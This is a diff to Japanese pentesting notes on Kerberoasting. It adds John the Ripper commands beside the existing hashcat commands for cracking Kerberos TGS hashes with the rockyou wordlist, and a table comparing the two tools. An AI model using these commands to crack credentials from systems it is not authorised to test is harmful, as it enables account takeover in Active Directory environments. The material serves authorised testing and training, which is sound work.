@@ -78,7 +78,9 @@ python3 targetedKerberoast.py -v \
 
 ## ハッシュのクラック
 
-取得したハッシュ（`$krb5tgs$23$...` 形式）を hashcat でクラック：
+取得したハッシュ（`$krb5tgs$23$...` 形式）をクラックする。hashcat と John the Ripper どちらでも可。
+
+**hashcat（ペネトレ用 Linux ディストリ標準搭載）：**
 
 ```bash
 # -m 13100 は Kerberos TGS-REP etype 23 (RC4)
@@ -91,6 +93,24 @@ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
 # AES 暗号化の場合（etype 18）
 hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
+**John the Ripper（ペネトレ用 Linux ディストリ標準搭載。`$krb5tgs$` フォーマットをそのまま認識する）：**
+
+```bash
+# TGS ハッシュをファイルに保存してそのまま渡す
+john --wordlist=/usr/share/wordlists/rockyou.txt [TARGET_USER].hash
+
+# クラック済みパスワードを確認
+john --show [TARGET_USER].hash
+```
+
+**使い分け：**
+
+| 状況 | 推奨 |
+|------|------|
+| GPU が使える（高速クラック重視） | hashcat |
+| GPU なし・CPU のみ | John the Ripper（CPU 最適化されている） |
+| ルールベースのクラックをシンプルに試したい | どちらでも可 |
 
 → 詳細: `../../05_Tools_Reference/Hashcat.md`
 
